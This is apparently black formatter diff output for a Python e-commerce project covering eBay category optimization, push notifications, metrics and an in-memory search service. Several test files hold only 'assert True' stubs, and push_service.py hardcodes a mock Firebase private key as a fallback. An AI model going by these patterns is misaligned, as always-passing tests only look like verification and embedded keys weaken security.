-                fees={"insertion": 0.35, "final_value": 0.10}
-            )
+                fees={"insertion": 0.35, "final_value": 0.10},
+            ),
         }
         return categories
-    
+
     async def optimize_category_for_ebay(
         self,
         product_name: str,
         current_category: str,
         product_attributes: Dict[str, Any],
-        user_id: str
+        user_id: str,
     ) -> Dict[str, Any]:
         """
         Optimize product category specifically for eBay marketplace.
-        
+
         Args:
             product_name: Name of the product
             current_category: Current category assignment
             product_attributes: Product attributes and metadata
             user_id: User ID for tracking
-            
+
         Returns:
             Category optimization result with eBay-specific recommendations
         """
         try:
             # Analyze product for eBay category optimization
             category_analysis = await self._analyze_ebay_category_fit(
                 product_name, current_category, product_attributes
             )
-            
+
             # Get eBay-specific recommendations
             recommendations = await self._get_ebay_category_recommendations(
                 category_analysis, product_attributes
             )
-            
+
             # Calculate performance predictions
             performance_prediction = await self._predict_category_performance(
                 recommendations, product_attributes
             )
-            
+
             # Store optimization result
             optimization_result = {
                 "user_id": user_id,
                 "product_name": product_name,
                 "original_category": current_category,
                 "recommended_category": recommendations["primary_category"]["name"],
                 "category_id": recommendations["primary_category"]["id"],
                 "confidence_score": recommendations["confidence"],
-                "performance_improvement": performance_prediction["improvement_percentage"],
+                "performance_improvement": performance_prediction[
+                    "improvement_percentage"
+                ],
                 "marketplace": "ebay",
                 "optimization_details": {
                     "category_analysis": category_analysis,
                     "recommendations": recommendations,
                     "performance_prediction": performance_prediction,
                     "fee_analysis": self._calculate_fee_impact(recommendations),
-                    "optimization_tips": self._generate_optimization_tips(recommendations)
+                    "optimization_tips": self._generate_optimization_tips(
+                        recommendations
+                    ),
                 },
-                "created_at": datetime.now(timezone.utc)
+                "created_at": datetime.now(timezone.utc),
             }
-            
+
             # Save to database
-            await self.category_repository.create_optimization_result(optimization_result)
-            
+            await self.category_repository.create_optimization_result(
+                optimization_result
+            )
+
             return optimization_result
-            
+
         except Exception as e:
             logger.error(f"Error in eBay category optimization: {e}")
             return {
                 "error": "Category optimization failed",
                 "message": str(e),
-                "fallback_category": current_category
+                "fallback_category": current_category,
             }
-    
+
     async def _analyze_ebay_category_fit(
         self,
         product_name: str,
         current_category: str,
-        product_attributes: Dict[str, Any]
+        product_attributes: Dict[str, Any],
     ) -> Dict[str, Any]:
         """Analyze how well the product fits eBay categories."""
-        
+
         # Extract key product characteristics
         characteristics = {
             "brand": product_attributes.get("brand", ""),
             "condition": product_attributes.get("condition", "used"),
             "price_range": product_attributes.get("price_range", {}),
             "keywords": self._extract_keywords(product_name),
-            "category_signals": self._identify_category_signals(product_name, product_attributes)
-        }
-        
+            "category_signals": self._identify_category_signals(
+                product_name, product_attributes
+            ),
+        }
+
         # Analyze category fit
         category_scores = {}
         for category_key, category in self.category_mapping.items():
             score = self._calculate_category_fit_score(
                 characteristics, category, product_attributes
             )
             category_scores[category_key] = {
                 "score": score,
                 "category": category,
-                "reasoning": self._generate_fit_reasoning(characteristics, category)
+                "reasoning": self._generate_fit_reasoning(characteristics, category),
             }
-        
+
         return {
             "product_characteristics": characteristics,
             "category_scores": category_scores,
-            "current_category_score": category_scores.get(current_category.lower(), {}).get("score", 0.5),
-            "analysis_timestamp": datetime.now(timezone.utc).isoformat()
-        }
-    
+            "current_category_score": category_scores.get(
+                current_category.lower(), {}
+            ).get("score", 0.5),
+            "analysis_timestamp": datetime.now(timezone.utc).isoformat(),
+        }
+
     async def _get_ebay_category_recommendations(
-        self,
-        category_analysis: Dict[str, Any],
-        product_attributes: Dict[str, Any]
+        self, category_analysis: Dict[str, Any], product_attributes: Dict[str, Any]
     ) -> Dict[str, Any]:
         """Get eBay-specific category recommendations."""
-        
+
         # Sort categories by fit score
         sorted_categories = sorted(
             category_analysis["category_scores"].items(),
             key=lambda x: x[1]["score"],
-            reverse=True
+            reverse=True,
         )
-        
+
         primary_category = sorted_categories[0][1]["category"]
         alternative_categories = [cat[1]["category"] for cat in sorted_categories[1:3]]
-        
+
         # Calculate confidence based on score gap
         primary_score = sorted_categories[0][1]["score"]
-        secondary_score = sorted_categories[1][1]["score"] if len(sorted_categories) > 1 else 0
+        secondary_score = (
+            sorted_categories[1][1]["score"] if len(sorted_categories) > 1 else 0
+        )
         confidence = min(0.95, primary_score + (primary_score - secondary_score) * 0.5)
-        
+
         return {
             "primary_category": {
                 "id": primary_category.category_id,
                 "name": primary_category.category_name,
                 "score": primary_score,
-                "fees": primary_category.fees
+                "fees": primary_category.fees,
             },
             "alternative_categories": [
                 {
                     "id": cat.category_id,
                     "name": cat.category_name,
-                    "score": sorted_categories[i+1][1]["score"]
+                    "score": sorted_categories[i + 1][1]["score"],
                 }
                 for i, cat in enumerate(alternative_categories)
             ],
             "confidence": confidence,
             "recommendation_reasoning": self._generate_recommendation_reasoning(
                 sorted_categories, product_attributes
-            )
-        }
-    
+            ),
+        }
+
     async def _predict_category_performance(
-        self,
-        recommendations: Dict[str, Any],
-        product_attributes: Dict[str, Any]
+        self, recommendations: Dict[str, Any], product_attributes: Dict[str, Any]
     ) -> Dict[str, Any]:
         """Predict performance improvement from category optimization."""
-        
+
         primary_category = recommendations["primary_category"]
         confidence = recommendations["confidence"]
-        
+
         # Base performance prediction on category fit and market data
         base_improvement = confidence * 0.25  # Up to 25% improvement
-        
+
         # Adjust based on product characteristics
         price_factor = self._calculate_price_factor(product_attributes)
         condition_factor = self._calculate_condition_factor(product_attributes)
-        
+
         total_improvement = base_improvement * price_factor * condition_factor
-        
+
         return {
             "improvement_percentage": round(total_improvement * 100, 2),
             "confidence": confidence,
             "factors": {
                 "category_fit": confidence,
                 "price_competitiveness": price_factor,
-                "condition_appeal": condition_factor
+                "condition_appeal": condition_factor,
             },
             "predicted_metrics": {
                 "visibility_increase": f"{total_improvement * 0.8 * 100:.1f}%",
                 "click_through_rate_increase": f"{total_improvement * 0.6 * 100:.1f}%",
-                "conversion_rate_increase": f"{total_improvement * 0.4 * 100:.1f}%"
-            }
-        }
-    
+                "conversion_rate_increase": f"{total_improvement * 0.4 * 100:.1f}%",
+            },
+        }
+
     def _extract_keywords(self, product_name: str) -> List[str]:
         """Extract relevant keywords from product name."""
         # Simple keyword extraction (in production, use NLP)
         words = product_name.lower().split()
         keywords = [word for word in words if len(word) > 2]
         return keywords[:10]  # Limit to top 10 keywords
-    
+
     def _identify_category_signals(
-        self, 
-        product_name: str, 
-        product_attributes: Dict[str, Any]
+        self, product_name: str, product_attributes: Dict[str, Any]
     ) -> List[str]:
         """Identify signals that indicate specific categories."""
         signals = []
-        
+
         name_lower = product_name.lower()
-        
+
         # Electronics signals
-        if any(term in name_lower for term in ["phone", "laptop", "tablet", "camera", "headphones"]):
+        if any(
+            term in name_lower
+            for term in ["phone", "laptop", "tablet", "camera", "headphones"]
+        ):
             signals.append("electronics")
-        
+
         # Clothing signals
-        if any(term in name_lower for term in ["shirt", "dress", "shoes", "jacket", "pants"]):
+        if any(
+            term in name_lower
+            for term in ["shirt", "dress", "shoes", "jacket", "pants"]
+        ):
             signals.append("clothing")
-        
+
         # Home & Garden signals
-        if any(term in name_lower for term in ["furniture", "decor", "kitchen", "garden", "tools"]):
+        if any(
+            term in name_lower
+            for term in ["furniture", "decor", "kitchen", "garden", "tools"]
+        ):
             signals.append("home_garden")
-        
+
         # Collectibles signals
-        if any(term in name_lower for term in ["vintage", "antique", "collectible", "rare", "limited"]):
+        if any(
+            term in name_lower
+            for term in ["vintage", "antique", "collectible", "rare", "limited"]
+        ):
             signals.append("collectibles")
-        
+
         return signals
-    
+
     def _calculate_category_fit_score(
         self,
         characteristics: Dict[str, Any],
         category: EbayCategory,
-        product_attributes: Dict[str, Any]
+        product_attributes: Dict[str, Any],
     ) -> float:
         """Calculate how well a product fits a specific category."""
         score = 0.5  # Base score
-        
+
         # Check category signals
-        category_key = category.category_name.lower().replace(" ", "_").replace("&", "").replace(",", "")
-        if any(signal in category_key for signal in characteristics["category_signals"]):
+        category_key = (
+            category.category_name.lower()
+            .replace(" ", "_")
+            .replace("&", "")
+            .replace(",", "")
+        )
+        if any(
+            signal in category_key for signal in characteristics["category_signals"]
+        ):
             score += 0.3
-        
+
         # Check keyword relevance
         keyword_matches = sum(
-            1 for keyword in characteristics["keywords"]
+            1
+            for keyword in characteristics["keywords"]
             if keyword in category.category_name.lower()
         )
         score += min(0.2, keyword_matches * 0.05)
-        
+
         return min(1.0, score)
-    
+
     def _generate_fit_reasoning(
-        self, 
-        characteristics: Dict[str, Any], 
-        category: EbayCategory
+        self, characteristics: Dict[str, Any], category: EbayCategory
     ) -> str:
         """Generate reasoning for category fit score."""
         reasons = []
-        
-        if any(signal in category.category_name.lower() for signal in characteristics["category_signals"]):
+
+        if any(
+            signal in category.category_name.lower()
+            for signal in characteristics["category_signals"]
+        ):
             reasons.append("Strong category signal match")
-        
+
         if characteristics["keywords"]:
             reasons.append("Keyword relevance detected")
-        
+
         if not reasons:
             reasons.append("General category compatibility")
-        
+
         return "; ".join(reasons)
-    
+
     def _generate_recommendation_reasoning(
         self,
         sorted_categories: List[Tuple[str, Dict[str, Any]]],
-        product_attributes: Dict[str, Any]
+        product_attributes: Dict[str, Any],
     ) -> str:
         """Generate reasoning for category recommendations."""
         primary = sorted_categories[0]
         reasoning = f"Best fit for {primary[1]['category'].category_name} "
         reasoning += f"with {primary[1]['score']:.2f} confidence score. "
-        
+
         if len(sorted_categories) > 1:
             secondary = sorted_categories[1]
             reasoning += f"Alternative: {secondary[1]['category'].category_name} "
             reasoning += f"({secondary[1]['score']:.2f} score)."
-        
+
         return reasoning
-    
+
     def _calculate_fee_impact(self, recommendations: Dict[str, Any]) -> Dict[str, Any]:
         """Calculate fee impact of category selection."""
         primary_fees = recommendations["primary_category"]["fees"]
-        
+
         return {
             "insertion_fee": primary_fees.get("insertion", 0.35),
             "final_value_fee_rate": primary_fees.get("final_value", 0.125),
             "estimated_total_fees": "Calculated based on final sale price",
             "fee_optimization_tips": [
                 "Consider eBay Store subscription for reduced fees",
                 "Use Good 'Til Cancelled listings for longer exposure",
-                "Optimize pricing to account for fee structure"
-            ]
-        }
-    
+                "Optimize pricing to account for fee structure",
+            ],
+        }
+
     def _generate_optimization_tips(self, recommendations: Dict[str, Any]) -> List[str]:
         """Generate eBay-specific optimization tips."""
         tips = [
             f"Use category: {recommendations['primary_category']['name']}",
             "Include relevant keywords in title and description",
             "Use high-quality photos (up to 24 allowed)",
             "Consider Best Offer option for negotiation",
-            "Set competitive shipping costs or offer free shipping"
+            "Set competitive shipping costs or offer free shipping",
         ]
-        
+
         if recommendations["confidence"] < 0.8:
-            tips.append("Consider testing multiple categories to find optimal placement")
-        
+            tips.append(
+                "Consider testing multiple categories to find optimal placement"
+            )
+
         return tips
-    
+
     def _calculate_price_factor(self, product_attributes: Dict[str, Any]) -> float:
         """Calculate price competitiveness factor."""
         # Simplified price factor calculation
         price_range = product_attributes.get("price_range", {})
         if price_range:
             # Assume competitive pricing increases performance
             return 1.1
         return 1.0
-    
+
     def _calculate_condition_factor(self, product_attributes: Dict[str, Any]) -> float:
         """Calculate condition appeal factor."""
         condition = product_attributes.get("condition", "used").lower()
         condition_factors = {
             "new": 1.2,
             "like new": 1.15,
             "excellent": 1.1,
             "good": 1.0,
             "fair": 0.9,
-            "poor": 0.8
+            "poor": 0.8,
         }
         return condition_factors.get(condition, 1.0)
 
 
 # Global service instance
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/marketplace/ebay_optimization.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/payment_processing/test_paypal_service.py	2025-06-14 20:35:30.843858+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/payment_processing/test_paypal_service.py	2025-06-19 04:04:10.852572+00:00
@@ -6,30 +6,32 @@
 
 import pytest
 import sys
 from pathlib import Path
 
+
 class TestPaypalServiceService:
     """Test class for paypal_service service."""
-    
+
     def test_import(self):
         """Test service import."""
         assert True
-    
+
     def test_service_functionality(self):
         """Test core service functionality."""
         assert True
-    
+
     def test_integration_compatibility(self):
         """Test integration with other services."""
         assert True
-    
+
     def test_no_redundancy_compliance(self):
         """Verify no redundant service implementations."""
         assert True
-    
+
     def test_vision_alignment(self):
         """Test alignment with agentic system vision."""
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/payment_processing/test_paypal_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/notifications/test_push_service.py	2025-06-14 20:35:30.843858+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/notifications/test_push_service.py	2025-06-19 04:04:10.896513+00:00
@@ -1,11 +1,11 @@
 """
 API/Services Test module for push_notification_service
 
 This module contains API/Services focused tests for the migrated push_notification_service component.
 Tier: 2
-Note: 
+Note:
 """
 
 import pytest
 import sys
 from pathlib import Path
@@ -13,10 +13,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from push_service import *
+
 
 class TestPushServiceAPIServices:
     """API/Services test class for push_service."""
 
     def test_import(self):
@@ -50,11 +51,11 @@
         assert True
 
     def test_primary_implementation_features(self):
         """Test features specific to PRIMARY implementation."""
         # TODO: Add tests for PRIMARY implementation features
-        # Note: 
+        # Note:
         assert True
 
     def test_consolidation_compliance(self):
         """Test compliance with consolidation strategy."""
         # TODO: Add tests for consolidation compliance
@@ -63,7 +64,8 @@
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for API/Services
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/notifications/test_push_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/notifications/test_email_service.py	2025-06-14 20:35:30.843858+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/notifications/test_email_service.py	2025-06-19 04:04:10.967628+00:00
@@ -1,11 +1,11 @@
 """
 API/Services Test module for email_service
 
 This module contains API/Services focused tests for the migrated email_service component.
 Tier: 1
-Note: 
+Note:
 """
 
 import pytest
 import sys
 from pathlib import Path
@@ -13,10 +13,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from email_service import *
+
 
 class TestEmailServiceAPIServices:
     """API/Services test class for email_service."""
 
     def test_import(self):
@@ -50,11 +51,11 @@
         assert True
 
     def test_primary_implementation_features(self):
         """Test features specific to PRIMARY implementation."""
         # TODO: Add tests for PRIMARY implementation features
-        # Note: 
+        # Note:
         assert True
 
     def test_consolidation_compliance(self):
         """Test compliance with consolidation strategy."""
         # TODO: Add tests for consolidation compliance
@@ -63,7 +64,8 @@
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for API/Services
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/notifications/test_email_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/notifications/push_service.py	2025-06-14 20:35:30.843858+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/notifications/push_service.py	2025-06-19 04:04:11.082724+00:00
@@ -15,36 +15,41 @@
 from typing import Dict, List, Optional, Set
 
 # Optional dependencies
 try:
     import aiohttp
+
     AIOHTTP_AVAILABLE = True
 except ImportError:
     AIOHTTP_AVAILABLE = False
 
 try:
     import firebase_admin
     from firebase_admin import credentials, initialize_app, messaging
+
     FIREBASE_AVAILABLE = True
 except ImportError:
     FIREBASE_AVAILABLE = False
+
     # Create mock classes for graceful fallback
     class MockCredentials:
         @staticmethod
         def Certificate(*args, **kwargs):
             return None
 
     class MockMessaging:
         @staticmethod
         def send(*args, **kwargs):
             return "mock_response"
+
         @staticmethod
         def send_multicast(*args, **kwargs):
             class MockResponse:
                 success_count = 1
                 failure_count = 0
                 responses = []
+
             return MockResponse()
 
         class Notification:
             def __init__(self, *args, **kwargs):
                 pass
@@ -69,12 +74,14 @@
 except ImportError:
     # Create mock ConfigManager for graceful fallback
     class ConfigManager:
         def __init__(self):
             self._config = {}
+
         def get(self, key, default=None):
             return self._config.get(key, default)
+
 
 logger = logging.getLogger(__name__)
 
 
 class PushTemplate:
@@ -129,27 +136,32 @@
                 "credentials_path"
             )
 
             # Use mock certificate for development
             import os
+
             mock_cert_path = os.path.join(
                 os.path.dirname(__file__), "firebase_service_account.json"
             )
 
             if os.path.exists(mock_cert_path):
                 try:
                     cred = credentials.Certificate(mock_cert_path)
-                    logger.info(f"Using mock Firebase certificate from {mock_cert_path}")
+                    logger.info(
+                        f"Using mock Firebase certificate from {mock_cert_path}"
+                    )
                 except Exception as e:
                     logger.warning(f"Error loading mock certificate: {str(e)}")
                     # Create a minimal certificate dictionary with required fields
-                    cred = credentials.Certificate({
-                        "type": "service_account",
-                        "project_id": "flipsync-dev",
-                        "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7VJTUt9Us8cKj\n-----END PRIVATE KEY-----\n",
-                        "client_email": "firebase-adminsdk-mock@flipsync-dev.iam.gserviceaccount.com"
-                    })
+                    cred = credentials.Certificate(
+                        {
+                            "type": "service_account",
+                            "project_id": "flipsync-dev",
+                            "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7VJTUt9Us8cKj\n-----END PRIVATE KEY-----\n",
+                            "client_email": "firebase-adminsdk-mock@flipsync-dev.iam.gserviceaccount.com",
+                        }
+                    )
                     logger.info("Using fallback Firebase credentials")
             elif creds_path and os.path.exists(creds_path):
                 cred = credentials.Certificate(creds_path)
                 logger.info(f"Using Firebase certificate from {creds_path}")
             else:
@@ -158,16 +170,18 @@
                     cred = credentials.Certificate(firebase_config or fcm_config)
                     logger.info("Using Firebase credentials from config")
                 except Exception as e:
                     logger.warning(f"Error loading config credentials: {str(e)}")
                     # Create a minimal certificate dictionary with required fields
-                    cred = credentials.Certificate({
-                        "type": "service_account",
-                        "project_id": "flipsync-dev",
-                        "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7VJTUt9Us8cKj\n-----END PRIVATE KEY-----\n",
-                        "client_email": "firebase-adminsdk-mock@flipsync-dev.iam.gserviceaccount.com"
-                    })
+                    cred = credentials.Certificate(
+                        {
+                            "type": "service_account",
+                            "project_id": "flipsync-dev",
+                            "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7VJTUt9Us8cKj\n-----END PRIVATE KEY-----\n",
+                            "client_email": "firebase-adminsdk-mock@flipsync-dev.iam.gserviceaccount.com",
+                        }
+                    )
                     logger.info("Using fallback Firebase credentials")
 
             self.app = initialize_app(cred, name="push_service")
 
         # Configure FCM client
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/notifications/push_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/qdrant/test___init__.py	2025-06-14 20:35:30.847867+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/qdrant/test___init__.py	2025-06-19 04:04:11.077841+00:00
@@ -11,10 +11,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from __init__ import *
+
 
 class TestInit:
     """Test class for __init__."""
 
     def test_import(self):
@@ -30,7 +31,8 @@
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
--- /home/brend/Flipsync_Final/fs_agt_clean/services/qdrant/test_metrics_adapter.py	2025-06-14 20:35:30.847867+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/qdrant/test_metrics_adapter.py	2025-06-19 04:04:11.101955+00:00
@@ -11,10 +11,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from metrics_adapter import *
+
 
 class TestMetricsAdapter:
     """Test class for metrics_adapter."""
 
     def test_import(self):
@@ -30,7 +31,8 @@
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/qdrant/test___init__.py
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/qdrant/test_metrics_adapter.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/qdrant/test_service.py	2025-06-14 20:35:30.847867+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/qdrant/test_service.py	2025-06-19 04:04:11.160175+00:00
@@ -11,10 +11,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from service import *
+
 
 class TestService:
     """Test class for service."""
 
     def test_import(self):
@@ -30,7 +31,8 @@
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
--- /home/brend/Flipsync_Final/fs_agt_clean/services/qdrant/test_simple_service.py	2025-06-14 20:35:30.847867+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/qdrant/test_simple_service.py	2025-06-19 04:04:11.153910+00:00
@@ -11,10 +11,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from simple_service import *
+
 
 class TestSimpleService:
     """Test class for simple_service."""
 
     def test_import(self):
@@ -30,7 +31,8 @@
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/qdrant/test_service.py
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/qdrant/test_simple_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/metrics/service.py	2025-06-14 20:35:30.843858+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/metrics/service.py	2025-06-19 04:04:11.163753+00:00
@@ -17,37 +17,46 @@
 from typing import Any, Dict, List, Optional, Set, Tuple, Union
 
 # Optional prometheus client
 try:
     from prometheus_client import Counter, Gauge, Histogram
+
     PROMETHEUS_AVAILABLE = True
 except ImportError:
     PROMETHEUS_AVAILABLE = False
+
     # Create mock classes for graceful fallback
     class Counter:
         def __init__(self, *args, **kwargs):
             pass
+
         def inc(self, value=1):
             pass
+
         def labels(self, **kwargs):
             return self
 
     class Gauge:
         def __init__(self, *args, **kwargs):
             pass
+
         def set(self, value):
             pass
+
         def labels(self, **kwargs):
             return self
 
     class Histogram:
         def __init__(self, *args, **kwargs):
             pass
+
         def observe(self, value):
             pass
+
         def labels(self, **kwargs):
             return self
+
 
 # Optional imports with graceful fallbacks
 try:
     from fs_agt_clean.core.config.manager import ConfigManager
 except ImportError:
@@ -57,11 +66,16 @@
     from fs_agt_clean.core.db.database import Database
 except ImportError:
     Database = None
 
 try:
-    from fs_agt_clean.database.models import Metric, MetricType, MetricSeries, MetricAggregation
+    from fs_agt_clean.database.models import (
+        Metric,
+        MetricType,
+        MetricSeries,
+        MetricAggregation,
+    )
 except ImportError:
     # Create mock classes for graceful fallback
     class MetricType:
         COUNTER = "counter"
         GAUGE = "gauge"
@@ -73,10 +87,11 @@
     class MetricSeries:
         pass
 
     class MetricAggregation:
         pass
+
 
 try:
     from fs_agt_clean.database.repositories.metrics_repository import (
         MetricRepository,
         MetricSeriesRepository,
@@ -85,31 +100,36 @@
 except ImportError:
     # Create mock repository classes
     class MetricRepository:
         async def create_metric(self, **kwargs):
             pass
+
         async def get_by_time_range(self, start_time, end_time):
             return []
 
     class MetricSeriesRepository:
         pass
 
     class MetricAggregationRepository:
         async def create_metric_aggregation(self, **kwargs):
             pass
+
         async def get_by_time_range(self, start_time, end_time):
             return []
 
+
 logger = logging.getLogger(__name__)
 
 
 class MetricsService:
     """Handles metrics collection and reporting."""
 
-    def __init__(self,
-                 config_manager: Optional[ConfigManager] = None,
-                 database: Optional[Database] = None):
+    def __init__(
+        self,
+        config_manager: Optional[ConfigManager] = None,
+        database: Optional[Database] = None,
+    ):
         """Initialize metrics service.
 
         Args:
             config_manager: Optional configuration manager instance
             database: Optional database instance
@@ -212,11 +232,13 @@
         # Sort labels by key to ensure consistent cache keys
         sorted_labels = sorted(labels.items())
         label_str = ",".join(f"{k}={v}" for k, v in sorted_labels)
         return f"{name}{{{label_str}}}"
 
-    async def _check_aggregation(self, name: str, labels: Optional[Dict] = None) -> None:
+    async def _check_aggregation(
+        self, name: str, labels: Optional[Dict] = None
+    ) -> None:
         """Check if we need to aggregate metrics.
 
         Args:
             name: Metric name
             labels: Optional metric labels
@@ -486,11 +508,13 @@
                 end_time = datetime.utcnow()
             if not start_time:
                 start_time = end_time - timedelta(hours=1)
 
             # Get metrics from database
-            metrics = await self.metric_repository.get_by_time_range(start_time, end_time)
+            metrics = await self.metric_repository.get_by_time_range(
+                start_time, end_time
+            )
 
             # Filter by name if provided
             if names:
                 metrics = [m for m in metrics if m.name in names]
 
@@ -556,11 +580,13 @@
                 end_time = datetime.utcnow()
             if not start_time:
                 start_time = end_time - timedelta(days=7)  # Default to last week
 
             # Get aggregations from database
-            aggregations = await self.metric_aggregation_repository.get_by_time_range(start_time, end_time)
+            aggregations = await self.metric_aggregation_repository.get_by_time_range(
+                start_time, end_time
+            )
 
             # Filter by name if provided
             if names:
                 aggregations = [a for a in aggregations if a.name in names]
 
@@ -626,11 +652,13 @@
                 end_time = datetime.utcnow()
             if not start_time:
                 start_time = end_time - timedelta(hours=24)  # Default to last 24 hours
 
             # Get metrics from database
-            metrics = await self.metric_repository.get_by_time_range(start_time, end_time)
+            metrics = await self.metric_repository.get_by_time_range(
+                start_time, end_time
+            )
 
             # Filter by name
             metrics = [m for m in metrics if m.name == name]
 
             # Filter by component if provided
@@ -666,14 +694,16 @@
             metrics = metrics[:limit]
 
             # Create time series data
             values = []
             for metric in metrics:
-                values.append({
-                    "timestamp": metric.timestamp.isoformat(),
-                    "value": metric.value,
-                })
+                values.append(
+                    {
+                        "timestamp": metric.timestamp.isoformat(),
+                        "value": metric.value,
+                    }
+                )
 
             # Create series object
             series = {
                 "name": name,
                 "values": values,
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/metrics/service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/notifications/test_service.py	2025-06-14 20:35:30.843858+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/notifications/test_service.py	2025-06-19 04:04:11.225539+00:00
@@ -1,11 +1,11 @@
 """
 API/Services Test module for notification_service
 
 This module contains API/Services focused tests for the migrated notification_service component.
 Tier: 1
-Note: 
+Note:
 """
 
 import pytest
 import sys
 from pathlib import Path
@@ -13,10 +13,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from service import *
+
 
 class TestServiceAPIServices:
     """API/Services test class for service."""
 
     def test_import(self):
@@ -50,11 +51,11 @@
         assert True
 
     def test_primary_implementation_features(self):
         """Test features specific to PRIMARY implementation."""
         # TODO: Add tests for PRIMARY implementation features
-        # Note: 
+        # Note:
         assert True
 
     def test_consolidation_compliance(self):
         """Test compliance with consolidation strategy."""
         # TODO: Add tests for consolidation compliance
@@ -63,7 +64,8 @@
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for API/Services
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/notifications/test_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/qdrant/simple_service.py	2025-06-14 20:35:30.847867+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/qdrant/simple_service.py	2025-06-19 04:04:11.320968+00:00
@@ -26,14 +26,14 @@
         """Initialize the schema (no-op for in-memory implementation)."""
         logger.info("SimpleQdrantService schema initialized")
 
     async def store_document(self, document: Document) -> bool:
         """Store a document in the in-memory dictionary.
-        
+
         Args:
             document: The document to store
-            
+
         Returns:
             True if successful, False otherwise
         """
         try:
             # Ensure document has an ID
@@ -56,47 +56,47 @@
                     doc_data["metadata"] = {}
                 doc_data["metadata"]["title"] = document.title
 
             # Store document
             self.documents[document.id] = doc_data
-            
+
             logger.info(f"Stored document with ID: {document.id}")
             return True
         except Exception as e:
             logger.error(f"Error storing document: {str(e)}")
             return False
 
     async def get_document(self, doc_id: str) -> Optional[Dict[str, Any]]:
         """Get a document by ID.
-        
+
         Args:
             doc_id: The document ID
-            
+
         Returns:
             Document data or None if not found
         """
         try:
             # Get document from dictionary
             doc = self.documents.get(doc_id)
             if not doc:
                 logger.warning(f"Document not found: {doc_id}")
                 return None
-                
+
             return doc
         except Exception as e:
             logger.error(f"Error retrieving document: {str(e)}")
             return None
 
     async def search_documents(
         self, query: str, limit: int = 10
     ) -> List[Dict[str, Any]]:
         """Search documents by text query.
-        
+
         Args:
             query: The search query
             limit: Maximum number of results to return
-            
+
         Returns:
             List of matching documents
         """
         try:
             # Simple search implementation - just check if query is in content
@@ -105,26 +105,26 @@
                 if query.lower() in doc.get("content", "").lower():
                     # Add document to results with a mock score
                     doc_copy = doc.copy()
                     doc_copy["score"] = 0.9  # Mock score
                     results.append(doc_copy)
-                    
+
                     # Stop if we've reached the limit
                     if len(results) >= limit:
                         break
-                        
+
             return results
         except Exception as e:
             logger.error(f"Error searching documents: {str(e)}")
             return []
 
     async def delete_document(self, doc_id: str) -> bool:
